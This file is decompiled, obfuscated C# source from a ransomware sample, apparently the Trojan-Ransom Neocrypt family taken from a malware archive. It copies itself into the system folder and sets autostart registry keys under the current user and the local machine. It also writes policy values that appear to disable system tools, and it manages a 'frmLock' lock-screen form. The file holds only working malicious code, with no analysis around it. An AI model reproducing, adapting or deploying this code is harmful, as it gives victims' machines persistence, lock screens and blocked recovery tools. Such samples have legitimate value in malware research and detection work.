// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=679946a7cf437fcb
// MVID: 86897229-7BC6-4141-B9B1-66C325C24A9D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Neocrypt.d-9ac5e14466821854f24f31402e9e3cdf97e476fcd0edf111aab0d7189ab5e577.exe

using \u0003;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u0001
{
  internal class \u0003
  {
    public static string \u0001;
    [NonSerialized]
    internal static \u0006 \u000E;

    static \u0003()
    {
      System.Type type = typeof (\u0001.\u0003);
      if (true)
        goto label_2;
label_1:
      \u0001.\u0003.\u0001 = \u001D.\u0083\u0002(\u001C.\u0082\u0002(Environment.SpecialFolder.System), \u0001.\u0003.\u000E(660));
      return;
label_2:
      \u0007.\u0001(type);
      goto label_1;
    }

    [DllImport("advapi32.dll", EntryPoint = "GetUserNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0001([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer, ref int nSize);

    public static void \u0001(bool AutostartEnable)
    {
      RegistryKey registryKey1;
      RegistryKey registryKey2;
      RegistryKey registryKey3;
      RegistryKey registryKey4;
      if (true)
      {
        if (\u001E.\u0084\u0002(\u0001.\u0003.\u0001))
          goto label_3;
label_2:
        \u007F.\u0089\u0002(\u001F.\u0086\u0002(), \u0001.\u0003.\u0001, true);
label_3:
        registryKey3 = \u0080.\u007E\u008A\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(681), true);
        RegistryKey registryKey5 = \u0080.\u007E\u008A\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(681), true);
        if (true)
          goto label_12;
label_4:
        registryKey1 = \u0080.\u007E\u008A\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(742), true);
        registryKey2 = \u0080.\u007E\u008A\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(811), true);
        if (AutostartEnable)
        {
          \u0081.\u007E\u008B\u0002((object) registryKey3, \u0001.\u0003.\u000E(884), (object) \u0001.\u0003.\u0001);
          if (true)
            \u0081.\u007E\u008B\u0002((object) registryKey4, \u0001.\u0003.\u000E(884), (object) \u0001.\u0003.\u0001);
          else
            goto label_11;
        }
        else
          goto label_8;
label_7:
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(884), (object) \u0001.\u0003.\u0001);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(897), (object) \u0001.\u0003.\u0001);
        if (false)
          goto label_2;
        else
          goto label_10;
label_8:
        \u0082.\u007E\u008D\u0002((object) registryKey3, \u0001.\u0003.\u000E(884), false);
        \u0082.\u007E\u008D\u0002((object) registryKey4, \u0001.\u0003.\u000E(884), false);
        if (true)
        {
          \u0082.\u007E\u008D\u0002((object) registryKey1, \u0001.\u0003.\u000E(884), false);
          \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(897), (object) \u0001.\u0003.\u0001);
          goto label_10;
        }
        else
          goto label_7;
label_12:
        registryKey4 = registryKey5;
        goto label_4;
      }
label_10:
      \u0013.\u007E\u009F((object) registryKey3);
      \u0013.\u007E\u009F((object) registryKey4);
label_11:
      \u0013.\u007E\u009F((object) registryKey1);
      \u0013.\u007E\u009F((object) registryKey2);
    }

    private static string \u0001()
    {
      // ISSUE: type reference
      string str1 = new Guid(\u0011.\u007E\u008F((object) (GuidAttribute) \u0086.\u007E\u0090\u0002((object) \u0084.\u007E\u008F\u0002((object) \u0083.\u007E\u008E\u0002((object) \u0002.\u0003.Forms.frmLock)), \u0010.\u008D(__typeref (GuidAttribute)), false)[0])).ToString();
      string str2;
      do
      {
        str2 = str1;
      }
      while (false);
      return str2;
    }

    public static void \u0001()
    {
label_0:
      RegistryKey registryKey1;
      if (true)
        registryKey1 = \u0087.\u007E\u0091\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(906));
      do
      {
        \u0088 obj = \u0088.\u007E\u0092\u0002;
        RegistryKey registryKey2 = registryKey1;
        string str = \u0001.\u0003.\u000E(983);
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) 0;
        if (true)
          goto label_6;
label_3:
        if (true)
        {
          \u0013.\u007E\u009F((object) registryKey1);
          continue;
        }
        goto label_0;
label_6:
        obj((object) registryKey2, str, (object) local, RegistryValueKind.DWord);
        goto label_3;
      }
      while (false);
    }

    public static void \u0002(bool disable)
    {
      RegistryKey registryKey1 = \u0087.\u007E\u0091\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(906));
      RegistryKey registryKey2 = \u0087.\u007E\u0091\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(906));
      if (disable)
      {
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(996), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(996), (object) 1);
      }
      else
      {
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(996), (object) 0);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(996), (object) 0);
      }
      \u0013.\u007E\u009F((object) registryKey1);
    }

    public static void \u0003(bool disable)
    {
      RegistryKey registryKey1 = \u0087.\u007E\u0091\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(906));
      RegistryKey registryKey2 = \u0087.\u007E\u0091\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(906));
      if (disable)
      {
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1017), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(1017), (object) 1);
      }
      else
      {
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1017), (object) 0);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(1017), (object) 0);
      }
      \u0013.\u007E\u009F((object) registryKey1);
    }

    public static void \u0004(bool disable)
    {
      RegistryKey registryKey1 = \u0087.\u007E\u0091\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(1046));
      RegistryKey registryKey2 = \u0087.\u007E\u0091\u0002((object) Registry.LocalMachine, \u0001.\u0003.\u000E(1127));
      RegistryKey registryKey3 = \u0087.\u007E\u0091\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(1046));
      RegistryKey registryKey4;
      do
      {
        if (true)
        {
          registryKey4 = \u0087.\u007E\u0091\u0002((object) Registry.CurrentUser, \u0001.\u0003.\u000E(1127));
          if (!disable)
            goto label_4;
        }
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1184), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1193), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(1218), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey3, \u0001.\u0003.\u000E(1184), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey3, \u0001.\u0003.\u000E(1193), (object) 1);
        \u0081.\u007E\u008B\u0002((object) registryKey4, \u0001.\u0003.\u000E(1218), (object) 1);
      }
      while (false);
      goto label_5;
label_4:
      \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1184), (object) 0);
      \u0081.\u007E\u008B\u0002((object) registryKey1, \u0001.\u0003.\u000E(1193), (object) 0);
      \u0081.\u007E\u008B\u0002((object) registryKey2, \u0001.\u0003.\u000E(1218), (object) 0);
      \u0081.\u007E\u008B\u0002((object) registryKey3, \u0001.\u0003.\u000E(1184), (object) 0);
      \u0081.\u007E\u008B\u0002((object) registryKey3, \u0001.\u0003.\u000E(1193), (object) 0);
      \u0081.\u007E\u008B\u0002((object) registryKey4, \u0001.\u0003.\u000E(1218), (object) 0);
label_5:
      \u0013.\u007E\u009F((object) registryKey1);
    }

    public static void \u0002()
    {
      IEnumerator enumerator;
      try
      {
        if (true)
          enumerator = \u008A.\u007E\u0094\u0002((object) \u0089.\u007E\u0093\u0002((object) \u0002.\u0003.Forms.frmLock));
        while (\u0004.\u007E\u0006((object) enumerator))
        {
          Control control = (Control) \u008B.\u007E\u0095\u0002((object) enumerator);
          if (\u0015.\u001A\u0002(\u0011.\u007E\u0090((object) control), \u0011.\u007E\u0090((object) \u0002.\u0003.Forms.frmLock.btnExit), false) == 0)
            \u0006.\u007E\u001A((object) control, true);
          else
            \u0006.\u007E\u001A((object) control, false);
        }
      }
      finally
      {
        if (enumerator is IDisposable)
          \u0013.\u007E\u009E((object) (enumerator as IDisposable));
      }
    }
  }
}
